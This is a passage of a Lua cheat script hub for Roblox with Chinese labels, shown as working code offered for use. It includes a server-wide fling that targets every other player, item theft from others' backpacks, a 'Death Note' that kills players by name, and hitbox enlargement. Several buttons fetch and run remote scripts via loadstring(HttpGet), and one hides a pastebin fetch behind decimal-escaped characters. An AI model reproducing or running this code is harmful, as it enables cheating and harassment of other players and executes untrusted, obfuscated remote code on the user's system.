Respawn.Position = UDim2.new((AxisPositionX[1]), 0, 0, (AxisPositionY[3]))
Respawn.Size = UDim2.new(0, 100, 0, 25)
Respawn.Font = Enum.Font.FredokaOne
Respawn.Text = "关闭旋转"
Respawn.TextScaled = true
Respawn.ZIndex = 300

NoVertGain.Name = "NoVertGain"
NoVertGain.Parent = Menu
NoVertGain.BackgroundColor3 = SelectedTheme[4]
NoVertGain.BorderColor3 = SelectedTheme[3]
NoVertGain.TextColor3 = SelectedTheme[7]
NoVertGain.Position = UDim2.new((AxisPositionX[2]), 0, 0, (AxisPositionY[2]))
NoVertGain.Size = UDim2.new(0, 100, 0, 25)
NoVertGain.Font = Enum.Font.FredokaOne
NoVertGain.Text = "推荐"
NoVertGain.TextScaled = true
NoVertGain.ZIndex = 300

ToggleServerKill.Name = ""
ToggleServerKill.Parent = Menu
ToggleServerKill.BackgroundColor3 = SelectedTheme[4]
ToggleServerKill.BorderColor3 = SelectedTheme[3]
ToggleServerKill.TextColor3 = SelectedTheme[7]
ToggleServerKill.Position = UDim2.new((AxisPositionX[3]), 0, 0, (AxisPositionY[2]))
ToggleServerKill.Size = UDim2.new(0, 100, 0, 25)
ToggleServerKill.Font = Enum.Font.FredokaOne
ToggleServerKill.Text = "甩飞"
ToggleServerKill.TextScaled = true
ToggleServerKill.ZIndex = 300

CloseButton.Name = "Close Button"
CloseButton.AnchorPoint = Vector2.new(1, 0)
CloseButton.Parent = TitleBar
CloseButton.BackgroundColor3 = SelectedTheme[4]
CloseButton.BorderColor3 = SelectedTheme[3]
CloseButton.TextColor3 = SelectedTheme[7]
CloseButton.Position = UDim2.new(1, 0, 0, 0)
CloseButton.Size = UDim2.new(0, 25, 0, 25)
CloseButton.Font = Enum.Font.FredokaOne
CloseButton.Text = "关闭"
CloseButton.ZIndex = 300
CloseButton.TextSize = 14

--BodyThrust.Name = "Power"
--BodyThrust.Parent = plr.Character.Torso
--BodyThrust.Force = Vector3.new(0, 0, 0)
--BodyThrust.Location = Vector3.new(0, 0, 0)

--[[functions:]]--
local function DisplayText(title, text, duration)
	duration = duration or 1
	game.StarterGui:SetCore("SendNotification", 
		{
			Title = title;
			Text = text;
			Icon = "";
			Duration = duration;
		}
	)
end

local function DisplaySuggestion()
    for i,v in pairs(Suggestions) do
        if v >= 9999 and v == game.PlaceId then
            DisplayText("推荐速度调250-325","推荐速度调: "..Suggestions[i+1].." - "..Suggestions[i+2])
            SuggestionText.Text = "推荐速度调: "..Suggestions[i+1].." - "..Suggestions[i+2]
        end
    end
    if SuggestionText.Text == "e" then
        SuggestionText.Text = "No suggestion for this game"
    end
end


local function GetRigType()
    
    if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
        return Enum.HumanoidRigType.R15
    elseif plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
        return Enum.HumanoidRigType.R6
    else
        return nil
    end
end

local function GetDeadState(player)
    if player.Character.Humanoid:GetState() == Enum.HumanoidStateType.Dead then
        return true
    else
        return false
    end
end


local function EnableNoClip()
    
    if GetDeadState(plr) == false then
        if GetRigType() == Enum.HumanoidRigType.R6 then
            plr.Character:FindFirstChild("Torso").CanCollide            = false
            plr.Character:FindFirstChild("Head").CanCollide             = false
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = false
        elseif GetRigType() == Enum.HumanoidRigType.R15 then
            plr.Character:FindFirstChild("UpperTorso").CanCollide       = false
            plr.Character:FindFirstChild("LowerTorso").CanCollide       = false
            plr.Character:FindFirstChild("Head").CanCollide             = false
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = false
        end
    end
end

local function DisableNoClip()
    
    if GetDeadState(plr) == false then
        if GetRigType() == Enum.HumanoidRigType.R6 then
            plr.Character:FindFirstChild("Torso").CanCollide            = true
            plr.Character:FindFirstChild("Head").CanCollide             = true
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = true
        elseif GetRigType() == Enum.HumanoidRigType.R15 then
            plr.Character:FindFirstChild("UpperTorso").CanCollide       = true
            plr.Character:FindFirstChild("LowerTorso").CanCollide       = true
            plr.Character:FindFirstChild("Head").CanCollide             = true
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = true
        end
    end
end

local function OpenObject(object)
    local OpenAnim = TweenService:Create(
    	object,
    	TweenInfo.new(0.25, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), --Enum.EasingStyle.Linear, Enum.EasingDirection.In
    	{Size = UDim2.new(0, 110, 0, 35), BackgroundColor3 = SelectedTheme[6] }
    )
    
    OpenAnim:Play()
end

local function CloseObject(object)
    local CloseAnim = TweenService:Create(
    	object,
    	TweenInfo.new(0.25, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out),
    	{Size = UDim2.new(0, 100, 0, 25), BackgroundColor3 = SelectedTheme[4] }
    )
    
    CloseAnim:Play()
end

    
local function TToggleFling()
    Fling[1] = not Fling[1]
    if Fling[1] then
        OpenObject(ToggleFling)
        
        BodyThrust = Instance.new("BodyThrust")
        if GetRigType() == Enum.HumanoidRigType.R6 then
            BodyThrust.Parent = plr.Character.Torso
        elseif GetRigType() == Enum.HumanoidRigType.R15 then
            BodyThrust.Parent = plr.Character.UpperTorso
        end
        
        EnableNoClip()
        BodyThrust.Force = Vector3.new(Fling[3], 0, 0)
        BodyThrust.Location = Vector3.new(0, 0, Fling[3])
        
        
        print("Enabled fling")
    else
        CloseObject(ToggleFling)
        
        DisableNoClip()
        for i, v in pairs(plr.Character:GetDescendants()) do
            if v:IsA("BasePart") then
            v.Velocity, v.RotVelocity = Vector3.new(0, 0, 0), Vector3.new(0, 0, 0)
            end
        end
        BodyThrust:Destroy()
        
        print("Disabled fling")
        
    end
end

local function GetIfPlayerInGame(PlayerToFind)
    if PlayerService:FindFirstChild(PlayerToFind) then
        return true
    else
        return false
    end
end

local function ServerKek()
    local TargetList = {}
    local index = 1
    local playercount = 0
    
    if Fling[1] == true then
        TToggleFling()
    end
    
    for i,v in pairs(PlayerService:GetPlayers()) do
        if v ~= plr then
            playercount = playercount + 1
            table.insert(TargetList, v)
        end
    end
    
    for i,v in pairs(TargetList) do
       print(i,v.Name) 
    end
    
    
    while Fling[4] do
        if index > playercount then
            CloseObject(ToggleServerKill)
            DisplayText("全部甩飞成功","汉化鹤")
            Fling[4] = false
            break
        else
            local InGame = GetIfPlayerInGame(TargetList[index].Name)
            local Dead = GetDeadState(TargetList[index])
            if InGame == true and Dead == false then
                plr.Character.HumanoidRootPart.CFrame = TargetList[index].Character.HumanoidRootPart.CFrame --tp to them
                
                TToggleFling() --enable fling
                
                for i = 0,2,1 do
                    plr.Character.HumanoidRootPart.CFrame = TargetList[index].Character.HumanoidRootPart.CFrame
                    wait(0.15)
                end
                
                TToggleFling() --disable fling
                
                wait(0.1) --wait until disabled
                
                if plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated then --check if seated
                    plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Running) --get out if you are
                end
                
                index = index + 1 --go to next victim
                
                if Fling[4] == false then
                    break
                end
            else
                index = index + 1
            end
        end
    end
end

--[[events:]]--
CloseButton.MouseButton1Down:Connect(function()
    TitleBar:TweenPosition(UDim2.new(-0.3, 0, 0.7, 0), Enum.EasingDirection.In, Enum.EasingStyle.Back, 0.75)
	DisplayText("旋转甩飞关闭","汉化作者鹤")
	wait(0.8)
	ScreenGui.Enabled = false
	ScreenGui:Destroy()
	script:Destroy()
end)

SpeedUp.MouseButton1Down:Connect(function()
    Fling[3] = Fling[3] + 50
    SpeedBox.Text = "速度: "..Fling[3]
    
    if Fling[1] then
        BodyThrust.Force = Vector3.new(Fling[3], 0, 0)
        BodyThrust.Location = Vector3.new(0, 0, Fling[3])
    end
end)

SpeedDown.MouseButton1Down:Connect(function()
    Fling[3] = Fling[3] - 50
    SpeedBox.Text = "速度: "..Fling[3]
    
    if Fling[1] then
        BodyThrust.Force = Vector3.new(Fling[3], 0, 0)
        BodyThrust.Location = Vector3.new(0, 0, Fling[3])
    end
end)

SpeedBox.FocusLost:Connect(function()
    Fling[3] = SpeedBox.Text:gsub("%D",""):sub(0,5)
    if Fling[3] ~= nil then
        SpeedBox.Text = "速度: "..Fling[3]
        if Fling[1] then
            BodyThrust.Force = Vector3.new(Fling[3], 0, 0)
            BodyThrust.Location = Vector3.new(0, 0, Fling[3])
        end
    end
    
end)

Hotkey.FocusLost:Connect(function()
    Fling[2] = Hotkey.Text:split(" ")[1]:sub(1,1)
    if Fling[2] ~= nil then
        Hotkey.Text = "数值: "..Fling[2]
    end
end)


ToggleFling.MouseButton1Down:Connect(function()
    TToggleFling()
end)

Respawn.MouseButton1Down:Connect(function()
        
    if Fling[1] then --disable fling if its enabled
        TToggleFling()
    end
    
    wait(0.4) --wait for fling to stop
    
    for i=0,10,1 do
        plr.Character.Humanoid:ChangeState(2) --make player recover from falling
    end
    
    for i, v in pairs(plr.Character:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Velocity, v.RotVelocity = Vector3.new(0, 0, 0), Vector3.new(0, 0, 0)
        end
    end
end)

ToggleServerKill.MouseButton1Down:Connect(function()
    Fling[4] = not Fling[4]
    if Fling[4] then
        OpenObject(ToggleServerKill)
        DisplayText("开启全部甩飞","开启成功")
        ServerKek()
    else
        CloseObject(ToggleServerKill)
        DisplayText("关闭全部甩飞","全部甩飞已关闭")
    end
    
end)

NoVertGain.MouseButton1Down:Connect(function()
    Fling[5] = not Fling[5]
    if Fling[5] then
        OpenObject(NoVertGain)
    else
        CloseObject(NoVertGain)
    end
end)

RunService.Stepped:Connect(function()
    if Fling[1] then
        EnableNoClip()
    elseif Fling[5] then
        for i, v in pairs(plr.Character:GetDescendants()) do
            if v:IsA("BasePart") then
                v.Velocity, v.RotVelocity = Vector3.new(0, 0, 0), Vector3.new(0, 0, 0)
            end
        end
    end
end)

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        Dragging[1] = true
        Dragging[2] = input.Position
        Dragging[3] = TitleBar.Position
    end
end)

TitleBar.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        Dragging[1] = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        if Dragging[1] then
            local delta = input.Position - Dragging[2]
            TitleBar:TweenPosition(UDim2.new(Dragging[3].X.Scale, Dragging[3].X.Offset + delta.X, Dragging[3].Y.Scale, Dragging[3].Y.Offset + delta.Y), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 0.035)
            wait()
        end
    end
end)

mouse.KeyDown:Connect(function(key)
    if key == Fling[2] then
        TToggleFling()
    end
end)


DisplaySuggestion()
TitleBar:TweenPosition(UDim2.new(0.25, 0, 0.7, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.75)
return nil

  	end    

})

Tab:AddButton({

	Name = "走路甩人",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()

  	end    

})

Tab:AddButton({

	Name = "播放声音",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/beta/main/music.lua"))()

  	end    

})

Tab:AddButton({

	Name = "NA管理",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()

  	end    

})

Tab:AddButton({

	Name = "脸部放大（敌人）",

	Callback = function()

     _G.HeadSize = 8 
_G.Disabled = true
game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.Head.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.Head.Transparency = 1
v.Character.Head.BrickColor = BrickColor.new("Red")
v.Character.Head.Material = "Neon"
v.Character.Head.CanCollide = false
v.Character.Head.Massless = true
end)
end
end
end
end)

  	end    

})

Tab:AddButton({

	Name = "循环传送（搭创飞）",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/kXjfpFPh"))()

  	end    

})

Tab:AddButton({

	Name = "最强功能（提供功能）",

	Callback = function()

     loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\110\102\104\107\81\98\80\78\34\41\41\40\41")()

  	end    

})

local Tab = Window:MakeTab({

    Name = "物品后台",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

Tab:AddButton({

	Name = "偷别人物品",

	Callback = function()

     --Copy And Paste:
for i,v in pairs (game.Players:GetChildren()) do
wait()
for i,b in pairs (v.Backpack:GetChildren()) do
b.Parent = game.Players.LocalPlayer.Backpack
end
end

  	end    

})

Tab:AddButton({

	Name = "传送工具",

	Callback = function()

     mouse = game.Players.LocalPlayer:GetMouse() tool = Instance.new("Tool") tool.RequiresHandle = false tool.Name = "[FE] TELEPORT TOOL" tool.Activated:connect(function() local pos = mouse.Hit+Vector3.new(0,2.5,0) pos = CFrame.new(pos.X,pos.Y,pos.Z) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos end) tool.Parent = game.Players.LocalPlayer.Backpack

  	end    

})

Tab:AddButton({

	Name = "建筑工具",

	Callback = function()

     loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()

  	end    

})

Tab:AddButton({

	Name = "隐身工具",

	Callback = function()

     loadstring(game:HttpGet("https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)",true))()

  	end    

})

Tab:AddButton({

	Name = "死亡笔记",

	Callback = function()

     --Made by Hirari_Tear, credits to expro for the GUI--

local Handle = Instance.new('Part')

local Mesh = Instance.new('SpecialMesh')

local Death = Instance.new('Tool')

Death.Name = "Death Note"

Handle.Name = "Handle"

Death.Parent = game.Players.LocalPlayer.Backpack

Death.GripForward = Vector3.new(0.331, -0.766, 0.551)

Death.GripPos = Vector3.new(-0.8, 0, -0.8)

Death.GripRight = Vector3.new(-0.943, -0.297, 0.152)

Death.GripUp = Vector3.new(-0.048, 0.57, 0.82)

Death.ToolTip = "Kill your fucking rival"

Handle.Parent = Death

Mesh.Parent = Handle

Mesh.MeshId = "http://www.roblox.com/asset/?id=1136139"

Mesh.TextureId = "http://www.roblox.com/asset/?id=18276952"

Mesh.Scale = Vector3.new(0.55, 0.174, 0.6)

Handle.Rotation = Vector3.new(0,-90,0)

Death.Equipped:connect(function(mouse)

local Bounce = Enum.EasingStyle.Bounce

local Quad = Enum.EasingStyle.Quad

local Normal = Enum.EasingStyle.Linear



local ScreenGui = Instance.new("ScreenGui", game.Players["LocalPlayer"].PlayerGui)

ScreenGui.Name = "Death Note"



local open = Instance.new("ImageButton", ScreenGui)

open.Position = UDim2.new(1, -110, 1, 500)

open.Size = UDim2.new(0, 100,0, 150)

open.Image = "rbxassetid://18536731"

open:TweenPosition(UDim2.new(1, -110, 1, -150), "In", Bounce, 0.8, true)



local Note = Instance.new("Frame", ScreenGui)

Note.Active = true

Note.Position = UDim2.new(1, -321, 1, 500)

Note.Size = UDim2.new(0, 320,0, 250)

Note.Visible = false

Note.Draggable = true



open.MouseButton1Down:connect(function()

open:TweenPosition(UDim2.new(open.Position.X.Scale,open.Position.X.Offset, 1, 500), "Out", Normal, 0.8, true)

wait(0.30)

open.Visible = false

Note.Visible = true

Note.Position = UDim2.new(1, -321, 1, 500)

Note:TweenPosition(UDim2.new(1, -321, 1, -251), "In", Normal, 0.5, true)

end)



local bg = Instance.new("Frame", Note)

bg.BackgroundColor3 = Color3.fromRGB(31, 31, 31)

bg.Size = UDim2.new(0, 160,0, 250)

bg.ZIndex = 2



-- Background



local close = Instance.new("TextButton", bg)

close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)

close.BackgroundTransparency = 1

close.Position = UDim2.new(0, 8,0, 10)

close.Size = UDim2.new(0, 10,0, 10)

close.ZIndex = 4

close.Font = "Cartoon"

close.Text = "X"

close.TextColor3 = Color3.fromRGB(255, 255, 255)

close.TextSize = "17"



close.MouseButton1Down:connect(function()

Note:TweenPosition(UDim2.new(Note.Position.X.Scale,Note.Position.X.Offset,1, 500), "Out", Normal, 0.5, true)

wait(0.30)

Note.Visible = false

open.Visible = true

open:TweenPosition(UDim2.new(1, -110, 1, -150), "In", Normal, 0.8, true)

end)



local image1 = Instance.new("ImageLabel", bg)

image1.BackgroundTransparency = 1

image1.Size = UDim2.new(1, 0,1, 0)

image1.ZIndex = 3

image1.Image = "rbxassetid://18528551"



local title = Instance.new("TextLabel", bg)

title.BackgroundTransparency = 1

title.Position = UDim2.new(0, 0,0, 30)

title.Size = UDim2.new(1, 0,0, 30)

title.ZIndex = 4

title.Font = "Bodoni"

title.Text = "DEATH NOTE"

title.TextColor3 = Color3.fromRGB(255, 255, 255)

title.TextSize = "18"



local body = Instance.new("TextLabel", bg)

body.BackgroundTransparency = 1

body.Position = UDim2.new(0, 15,0, 65)

body.Size = UDim2.new(0, 134,0, 40)

body.ZIndex = 4

body.Font = "Garamond"

body.Text = "Type in somebody's name to kill them."

body.TextColor3 = Color3.fromRGB(255, 255, 255)

body.TextSize = "19"

body.TextWrapped = true

body.TextXAlignment = "Left"

body.TextYAlignment = "Top"



local line = Instance.new("TextLabel", body)

line.BackgroundTransparency = 1

line.Position = UDim2.new(0, 0,0, 50)

line.Size = UDim2.new(0, 130,0, 40)

line.ZIndex = 4

line.Font = "Garamond"

line.Text = "________________"

line.TextColor3 = Color3.fromRGB(255, 255, 255)

line.TextSize = "19"

line.TextWrapped = true

line.TextXAlignment = "Left"

line.TextYAlignment = "Top"



local text = Instance.new("TextLabel", body)

text.BackgroundTransparency = 1

text.Position = UDim2.new(0, 0,0, 100)

text.Size = UDim2.new(0, 134,0, 40)

text.ZIndex = 4

text.Font = "Garamond"

text.Text = "This was made by RcDZ."

text.TextColor3 = Color3.fromRGB(255, 255, 255)

text.TextSize = "19"

text.TextWrapped = true

text.TextXAlignment = "Left"

text.TextYAlignment = "Top"



-- Page



local page = Instance.new("Frame", Note)

page.BackgroundColor3 = Color3.fromRGB(236, 236, 236)

page.Position = UDim2.new(0, 160,0, 0)

page.Size = UDim2.new(0, 160,0, 250)

page.ZIndex = 2



local list = Instance.new("TextBox", page)

list.BackgroundTransparency = 1

list.Position = UDim2.new(0, 25,0, 20)

list.Size = UDim2.new(0.8, 5,0, 230)

list.ZIndex = 4

list.Font = "Antique"

list.Text = ""

list.TextColor3 = Color3.fromRGB(0, 0, 0)

list.TextSize = "23"

list.TextWrapped = true

list.TextXAlignment = "Left"

list.TextYAlignment = "Top"



local image2 = Instance.new("ImageLabel", page)

image2.BackgroundTransparency = 1

image2.Size = UDim2.new(1, 0,1, 0)

image2.ZIndex = 3

image2.Image = "rbxassetid://170279713"

image2.Transparency = 0.2



while true do

repeat wait() until game.Workspace:FindFirstChild(list.Text)

if game.Workspace[list.Text]:FindFirstChild("Humanoid") then

game.Workspace[list.Text].Humanoid.PlatformStand = true

game.Workspace[list.Text].Humanoid.Health = 0

elseif game.Workspace[list.Text]:FindFirstChild("Zombie") then

game.Workspace[list.Text].Zombie.PlatformStand = true

game.Workspace[list.Text].Zombie.Health = 0

end

end

end)

Death.Unequipped:connect(function(mouse)

game.Players.LocalPlayer.PlayerGui["Death Note"]:remove()

end)
--12333

  	end    

})

Tab:AddButton({

	Name = "分头行动",

	Callback = function()

     --made by Nightmare#0930
local lp = game.Players.LocalPlayer
local char = lp.Character

for i, v in pairs(char:GetChildren()) do
    if v:IsA("BallSocketConstraint") then
        v:Destroy()
    end
end

for i, v in pairs(char:GetChildren()) do
    if v:IsA("HingeConstraint") then
        v:Destroy()
    end
end

for i, v in pairs(char.Humanoid:GetAccessories()) do
local hat = v.Name

char[hat].Archivable = true
local fake = char[hat]:Clone()
fake.Parent = char
fake.Handle.Transparency = 1

local hold = false
local enabled = false

char[hat].Handle.AccessoryWeld:Destroy()

local tool = Instance.new("Tool", lp.Backpack)
tool.RequiresHandle = true
tool.CanBeDropped = false
tool.Name = hat

local handle = Instance.new("Part", tool)
handle.Name = "Handle"
handle.Size = Vector3.new(1, 1, 1)
handle.Massless = true
handle.Transparency = 1

local positions = {
    forward = tool.GripForward,
    pos = tool.GripPos,
    right = tool.GripRight,
    up = tool.GripUp
}

tool.Equipped:connect(function()
 hold = true
end)

tool.Unequipped:connect(function()
   hold = false
end)

tool.Activated:connect(function()
    if enabled == false then
        enabled = true
        tool.GripForward = Vector3.new(-0.976,0,-0.217)
    tool.GripPos = Vector3.new(.95,-0.76,1.4)
    tool.GripRight = Vector3.new(0.217,0, 0.976)
    tool.GripUp = Vector3.new(0,1,0)
    wait(.8)
    tool.GripForward = positions.forward
    tool.GripPos = positions.pos
    tool.GripRight = positions.right
    tool.GripUp = positions.up
    enabled = false
    end
end)

game:GetService("RunService").Heartbeat:connect(function()
    pcall(function()
       char[hat].Handle.Velocity = Vector3.new(30, 0, 0)
if hold == false then
    char[hat].Handle.CFrame = fake.Handle.CFrame
elseif hold == true then
    char[hat].Handle.CFrame = handle.CFrame
    end
end)
end)
end

  	end    

})

Tab:AddButton({

	Name = "小刀（没用）",

	Callback = function()

     --e = Kill 
--q = Fix Knife


me = game.Players.LocalPlayer
char = me.Character
selected = false
attacking = false
hurt = false
grabbed = nil
mode = "kill"
bloodcolors = {"Bright red", "Really red", "Crimson"}
enabled = true
enabled2 = true

local breaksound = Instance.new("Sound")
breaksound.SoundId = "http://www.roblox.com/asset/?id=2801263"
breaksound.Parent = game.Workspace
breaksound.Volume = 0.8
	
local killsound = Instance.new("Sound")
killsound.SoundId = "http://www.roblox.com/asset?id=16950449"
killsound.Pitch = 0.65
killsound.Parent = game.Workspace

local drainsound = Instance.new("Sound")
drainsound.SoundId = "http://www.roblox.com/asset/?id=2785493"
drainsound.Pitch = 0.7


function prop(part, parent, collide, tran, ref, x, y, z, color, anchor, form)
part.Parent = parent
part.formFactor = form
part.CanCollide = collide
part.Transparency = tran
part.Reflectance = ref
part.Size = Vector3.new(x,y,z)
part.BrickColor = BrickColor.new(color)
part.TopSurface = 0
part.BottomSurface = 0
part.Anchored = anchor
part.Locked = true
part:BreakJoints()
end

function weld(w, p, p1, a, b, c, x, y, z)
w.Parent = p
w.Part0 = p
w.Part1 = p1
w.C1 = CFrame.fromEulerAnglesXYZ(a,b,c) * CFrame.new(x,y,z)
end

function mesh(mesh, parent, x, y, z, type)
mesh.Parent = parent
mesh.Scale = Vector3.new(x, y, z)
mesh.MeshType = type
end

function remgui()
	for _,v in pairs(me.PlayerGui:GetChildren()) do
		if v.Name == "Modeshow" then
			v:remove()
		end
	end
end

function inform(text,delay)
	remgui()
	local sc = Instance.new("ScreenGui")
	sc.Parent = me.PlayerGui
	sc.Name = "Modeshow"
	local bak = Instance.new("Frame",sc)
	bak.BackgroundColor3 = Color3.new(1,1,1)
	bak.Size = UDim2.new(0.94,0,0.1,0)
	bak.Position = UDim2.new(0.03,0,0.037,0)
	bak.BorderSizePixel = 0
	local gi = Instance.new("TextLabel",sc)
	gi.Size = UDim2.new(0.92,0,0.09,0)
	gi.BackgroundColor3 = Color3.new(0,0,0)
	gi.Position = UDim2.new(0.04,0,0.042,0)
	gi.TextColor3 = Color3.new(1,1,1)
	gi.FontSize = "Size14"
	gi.Text = text
	coroutine.resume(coroutine.create(function()
		wait(delay)
		sc:remove()
	end))
end

if char:findFirstChild("Bricks",true) then
	char:findFirstChild("Bricks",true):remove()
end

bricks = Instance.new("Model",me.Character)
bricks.Name = "Bricks"

--Parts-------------------------Parts-------------------------Parts-------------------------Parts----------------------

rarm = char:findFirstChild("Right Arm")
larm = char:findFirstChild("Left Arm")
lleg = char:findFirstChild("Left Leg")
torso = char:findFirstChild("Torso")
hum = char:findFirstChild("Humanoid")
rleg = char:findFirstChild("Right Leg")

righthold = Instance.new("Part")
prop(righthold, bricks, false, 1, 0, 0.1, 0.1, 0.1, "Mid gray", false, "Custom")
w11 = Instance.new("Weld")
weld(w11, rarm, righthold, 0, 0, 0, 0, 1, 0)

lefthold = Instance.new("Part")
prop(lefthold, bricks, false, 1, 0, 0.1, 0.1, 0.1, "Mid gray", false, "Custom")
w12 = Instance.new("Weld")
weld(w12, larm, lefthold, 0, 0, 0, 0, 1, 0)

hold = Instance.new("Part")
prop(hold, bricks, false, 0, 0, 0.2, 0.3, 0.3, "Black", false, "Custom")
oh = Instance.new("Weld")
weld(oh, torso, hold, -math.pi/-0.86, 1.5, math.rad(0), -0.35, -0.4, -0.5)

knife = Instance.new("Part")
knife.Material = "Wood"
prop(knife, bricks, false, 0, 0, 0.25, 1.1, 0.3, "Pine Cone", false, "Custom")
orr = Instance.new("Weld")
weld(orr, hold, knife, 0, 0, 0, 0, 0.7, 0)
ar = Instance.new("Weld")
weld(ar, lefthold, nil, math.pi/2, 0, math.pi, 0, 0, 0)

blade = Instance.new("Part")
blade.Material = "Neon"
prop(blade, bricks, false, 0, 0, 0.1, 2.5, 0.25, "Mid gray", false, "Custom")
Instance.new("BlockMesh",blade).Scale = Vector3.new(0.3,1,1)
w2 = Instance.new("Weld")
weld(w2, knife, blade, 0, 0, 0, 0, -0.65, 0)

blade2 = Instance.new("Part")
blade2.Material = "Neon"
prop(blade2, bricks, false, 0, 0, 0.1, 0.4, 0.25, "Mid gray", false, "Custom")
local mew = Instance.new("SpecialMesh",blade2)
mew.MeshType = "Wedge"
mew.Scale = Vector3.new(0.3,1,1)
w3 = Instance.new("Weld")
weld(w3, blade, blade2, 0, 0, 0, 0, -1.45, 0)


rb = Instance.new("Part")
prop(rb, bricks, false, 1, 0, 0.1, 0.1, 0.1, "Bright red", false, "Custom")
w13 = Instance.new("Weld")
weld(w13, torso, rb, 0, 0, 0, -1.5, -0.5, 0)

lb = Instance.new("Part")
prop(lb, bricks, false, 1, 0, 0.1, 0.1, 0.1, "Bright red", false, "Custom")
w14 = Instance.new("Weld")
weld(w14, torso, lb, 0, 0, 0, 1.5, -0.5, 0)

rw = Instance.new("Weld")
weld(rw, rb, nil, 0, 0, 0, 0, 0.5, 0)

lw = Instance.new("Weld")
weld(lw, lb, nil, 0, 0, 0, 0, 0.5, 0)

grabweld = nil
platlol = nil
lolhum = nil

function touch(h)
	if hurt then
		if grabbed == nil then
			local hu = h.Parent:findFirstChild("Humanoid")
			local head = h.Parent:findFirstChild("Head")
			local torz = h.Parent:findFirstChild("Torso")
			if hu ~= nil and head ~= nil and torz ~= nil and h.Parent.Name ~= name then
				if hu.Health > 0 then
				grabbed = torz
				hu.PlatformStand = true
				local w = Instance.new("Weld")
				weld(w,righthold,grabbed,math.pi/2,0.2,0,0.7,-0.9,-0.6)
				grabweld = w
				lolhum = hu
				local lolxd = true
				platlol = lolxd
				hu.Changed:connect(function(prop)
					if prop == "PlatformStand" and platlol then
						hu.PlatformStand = true
					end
				end)
				end
			end
		end
	end
end

righthold.Touched:connect(touch)
lefthold.Touched:connect(touch)

function bleed(part,po)
	local lol1 = math.random(5,30)/100
	local lol2 = math.random(5,30)/100
	local lol3 = math.random(5,30)/100
	local lol4 = math.random(1,#bloodcolors)
	local p = Instance.new("Part")
	prop(p,part.Parent,false,0,0,lol1,lol2,lol3,bloodcolors[lol4],false,"Custom")
	p.CFrame = part.CFrame * CFrame.new(math.random(-5,5)/10,po,math.random(-5,5)/10)
	p.Velocity = Vector3.new(math.random(-25,25),math.random(-25,25),math.random(-25,25))
	p.RotVelocity = Vector3.new(math.random(-400,400)/10,math.random(-400,400)/10,math.random(-400,400)/10)
	p.CanCollide = true
	coroutine.resume(coroutine.create(function()
		wait(3)
		p:remove()
	end))
end

h = Instance.new("HopperBin",me.Backpack)

h.Name = "Knife"

script.Parent = h


bin = h



function select(mouse)
	orr.Part1 = nil
	ar.Part1 = knife
	mouse.Button1Down:connect(function()
		if attacking == false then
			attacking = true
			lw.Part1 = larm
			rw.Part1 = rarm
			hurt = true
			for i=1, 8 do
				rw.C0 = rw.C0 * CFrame.new(-0.03,0,-0.08) * CFrame.fromEulerAnglesXYZ(0.18,0.04,0)
				lw.C0 = lw.C0 * CFrame.new(0.06,0,-0.06) * CFrame.fromEulerAnglesXYZ(0.15,-0.11,-0.05)
				wait()
			end
			wait(1)
			hurt = false
			if grabbed == nil then
				for i=1, 4 do
					rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
					lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
					wait()
				end
				lw.C0 = CFrame.new(0,0,0)
				rw.C0 = CFrame.new(0,0,0)
				lw.Part1 = nil
				rw.Part1 = nil
				attacking = false
			end
		elseif hurt == false and grabbed ~= nil and mode == "drop" then
			enabled2 = true
			grabweld:remove()
			grabweld = nil
			platlol = false
			grabbed = nil
			lolhum.PlatformStand = false
			lolhum = nil
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
				lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.3,0.2,0)
				wait()
			end
			lw.C0 = CFrame.new(0,0,0)
			rw.C0 = CFrame.new(0,0,0)
			lw.Part1 = nil
			rw.Part1 = nil
			attacking = false
			platlol = nil
			
